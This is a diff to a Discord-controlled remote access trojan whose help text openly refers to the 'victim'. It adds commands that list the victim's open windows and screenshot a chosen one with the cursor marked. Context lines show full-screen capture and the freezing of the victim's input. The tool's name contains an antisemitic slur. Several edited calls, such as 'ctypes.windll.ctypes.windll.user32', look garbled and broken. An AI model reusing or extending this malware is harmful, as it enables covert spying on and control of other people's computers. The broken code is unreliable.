@@ -4,8 +4,10 @@ from Cryptodome.Cipher import AES
 from discord.ext import commands
 from PIL import Image, ImageDraw
 from comtypes import CLSCTX_ALL
+import ctypes.wintypes
 import soundcard as sc
 import win32com.client
+import win32process
 import numpy as np
 import subprocess
 import webbrowser
@@ -18,14 +20,17 @@ import datetime
 import platform
 import pymsgbox
 import requests
+import win32gui
+import win32con
 import asyncio
 import difflib
 import discord
+import getpass
 import pathlib
 import pystray
-import getpass
 import sqlite3
 import tarfile
+import win32ui
 import base64
 import ctypes
 import psutil
@@ -48,7 +53,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.8.4" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.9.0" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False - 28f93g
 
 intents = discord.Intents.all()
@@ -234,7 +239,7 @@ async def displaysleep(ctx):
 
     async def eepy():
         try:
-            await asyncio.to_thread(ctypes.windll.user32.SendMessageTimeoutW,0xFFFF,0x0112,0xF170,2,0,1000,None)
+            await asyncio.to_thread(ctypes.windll.ctypes.windll.user32.SendMessageTimeoutW,0xFFFF,0x0112,0xF170,2,0,1000,None)
         except Exception as e:
             await ctx.send(f"Error: {e}")
 
@@ -249,7 +254,7 @@ async def wallpaper(ctx, action: str = None, filepath: str = None):
 
         if action.lower() == "get":
             buf = ctypes.create_unicode_buffer(260)
-            ctypes.windll.user32.SystemParametersInfoW(0x0073, len(buf), buf, 0)
+            ctypes.windll.ctypes.windll.user32.SystemParametersInfoW(0x0073, len(buf), buf, 0)
             wallpaper_path = buf.value
 
             if os.path.exists(wallpaper_path):
@@ -271,7 +276,7 @@ async def wallpaper(ctx, action: str = None, filepath: str = None):
                 if not filepath.lower().endswith(valid_exts):
                     await ctx.send("Invalid file type from path. Must be .png, .jpg/jpeg, or .bmp.")
                     return
-                ctypes.windll.user32.SystemParametersInfoW(20, 0, filepath, 3)
+                ctypes.windll.ctypes.windll.user32.SystemParametersInfoW(20, 0, filepath, 3)
                 await ctx.send(f"Wallpaper set from path: `{filepath}`")
                 return
 
@@ -289,7 +294,7 @@ async def wallpaper(ctx, action: str = None, filepath: str = None):
             ext = os.path.splitext(attachment.filename)[-1]
             temp_path = os.path.join(os.getenv("TEMP"), f"wallpaper_{system_uuid}{ext}")
             await attachment.save(temp_path)
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_path, 3)
+            ctypes.windll.ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_path, 3)
             await ctx.send("Wallpaper set successfully from uploaded image.")
     except Exception as e:
         await ctx.send(f"Error processing wallpaper command: {str(e)}")
@@ -2057,6 +2062,132 @@ async def clipboard(ctx, *, args: str = None):
             await ctx.send("Invalid action. Use `get` or `set`.")
     except Exception as e:
         await ctx.send(f"Error executing command: {e}")
+        
+@bot.command(help="Lists Alt+Tab windows grouped by process name.", usage="$winlist")
+async def winlist(ctx):
+    wins = []
+
+    def cb(hwnd, _):
+        if not win32gui.IsWindowVisible(hwnd): return True
+        title = win32gui.GetWindowText(hwnd)
+        if not title or not title.strip(): return True
+        if win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) & win32con.WS_EX_TOOLWINDOW: return True
+        owner = win32gui.GetWindow(hwnd, win32con.GW_OWNER)
+        if owner and win32gui.IsWindowVisible(owner): return True
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        try: exe = psutil.Process(pid).name().strip()
+        except: exe = "unknown.exe"
+        wins.append({"pid": pid, "exe": exe, "title": title.strip()})
+        return True
+
+    win32gui.EnumWindows(cb, None)
+
+    groups = {}
+    for w in wins: groups.setdefault(w["exe"], []).append(w)
+
+    out = ["Process list"]
+    exe_keys = sorted(groups, key=str.lower)
+
+    for i, exe in enumerate(exe_keys):
+        last_exe = i == len(exe_keys) - 1
+        out.append(f"{'└──' if last_exe else '├──'} {exe}")
+
+        entries = sorted(groups[exe], key=lambda x: (x["pid"], x["title"].lower()))
+        for j, w in enumerate(entries):
+            last_entry = j == len(entries) - 1
+            prefix = "    " if last_exe else "│   "
+            branch = "└──" if last_entry else "├──"
+            out.append(f"{prefix}{branch} {w['pid']} | {w['title']}")
+
+    text = "```\n" + "\n".join(out).rstrip() + "\n```"
+    await ctx.fm_send(text)
+    
+@bot.command(help="Screenshots a window by PID/title/exe and shows cursor if inside.", usage="$ssw <window pid/title/exe>")
+async def ssw(ctx, *, match=""):
+    match = match.strip()
+    if not match:
+        await ctx.send("Usage: `$ssw <window pid/title/exe>`")
+        return
+
+    wins = []
+
+    def cb(hwnd, _):
+        if not win32gui.IsWindowVisible(hwnd): return True
+        title = win32gui.GetWindowText(hwnd)
+        if not title or not title.strip(): return True
+        if win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) & win32con.WS_EX_TOOLWINDOW: return True
+        owner = win32gui.GetWindow(hwnd, win32con.GW_OWNER)
+        if owner and win32gui.IsWindowVisible(owner): return True
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        try: exe = psutil.Process(pid).name().strip()
+        except: exe = "unknown.exe"
+        wins.append({"hwnd": hwnd, "pid": pid, "exe": exe, "title": title.strip()})
+        return True
+
+    win32gui.EnumWindows(cb, None)
+
+    target = None
+    if match.isdigit():
+        for w in wins:
+            if w["pid"] == int(match): target = w; break
+
+    if not target:
+        mc = re.compile(r"[^a-z0-9]+").sub("", match.lower())
+        for w in wins:
+            if re.compile(r"[^a-z0-9]+").sub("", w["title"].lower()) == mc: target = w; break
+
+    if not target:
+        ml = match.lower()
+        for w in wins:
+            if w["exe"].lower() == ml: target = w; break
+
+    if not target:
+        for w in wins:
+            if w["exe"].lower().startswith(match.lower()): target = w; break
+
+    if not target:
+        await ctx.send(f"No matching window for `{match}`")
+        return
+
+    hwnd = target["hwnd"]
+    wl, wt, wr, wb = win32gui.GetWindowRect(hwnd)
+    ww, wh = wr - wl, wb - wt
+    if ww <= 0 or wh <= 0:
+        await ctx.send("Invalid window size")
+        return
+
+    rect = ctypes.wintypes.RECT()
+    hr = ctypes.windll.dwmapi.DwmGetWindowAttribute(ctypes.wintypes.HWND(hwnd), ctypes.wintypes.DWORD(9), ctypes.byref(rect), ctypes.sizeof(rect))
+    dl, dt, dr, db = (rect.left, rect.top, rect.right, rect.bottom) if hr == 0 else (wl, wt, wr, wb)
+    dw, dh = dr - dl, db - dt
+    if dw <= 0 or dh <= 0: dl, dt, dw, dh = wl, wt, ww, wh
+
+    hdc = win32gui.GetWindowDC(hwnd)
+    mdc = win32ui.CreateDCFromHandle(hdc)
+    sdc = mdc.CreateCompatibleDC()
+    bmp = win32ui.CreateBitmap()
+    bmp.CreateCompatibleBitmap(mdc, ww, wh)
+    sdc.SelectObject(bmp)
+    ok = ctypes.windll.user32.PrintWindow(hwnd, sdc.GetSafeHdc(), 2)
+
+    img = Image.frombuffer("RGB", (bmp.GetInfo()["bmWidth"], bmp.GetInfo()["bmHeight"]), bmp.GetBitmapBits(True), "raw", "BGRX", 0, 1)
+
+    win32gui.DeleteObject(bmp.GetHandle())
+    sdc.DeleteDC(); mdc.DeleteDC(); win32gui.ReleaseDC(hwnd, hdc)
+
+    dx, dy = dl - wl, dt - wt
+    img = img.crop((max(0, dx), max(0, dy), min(img.size[0], dx + dw), min(img.size[1], dy + dh)))
+
+    cx, cy = pyautogui.position()
+    rx, ry = cx - dl, cy - dt
+    inside = 0 <= rx < img.size[0] and 0 <= ry < img.size[1]
+    if inside: ImageDraw.Draw(img).ellipse((rx-5, ry-5, rx+5, ry+5), fill=(255, 0, 0))
+
+    buf = io.BytesIO()
+    img.save(buf, format="PNG")
+    buf.seek(0)
+
+    await ctx.send(f"Command Executed! (Red dot indicates cursor)", file=discord.File(buf, "window_capture.png"))
 
 @bot.command(help="Takes a screenshot of the victim's screen including cursor location. Optionally accepts a display index (default 0 for the full desktop).", usage="$ss [displayNum|0 (default/all)]")
 async def ss(ctx, display_index: int = 0):
@@ -2498,7 +2629,7 @@ async def move(ctx, source: str = None, destination: str = None):
 @bot.command(help="Freezes the cursor on the victim's system.", usage="$freezecursor")
 async def freezecursor(ctx):
     try:
-        result = ctypes.windll.user32.BlockInput(True)
+        result = ctypes.windll.ctypes.windll.user32.BlockInput(True)
         if result == 0:
             await ctx.send("Failed to freeze cursor. Victim is not running with elevated privileges.")
         else:
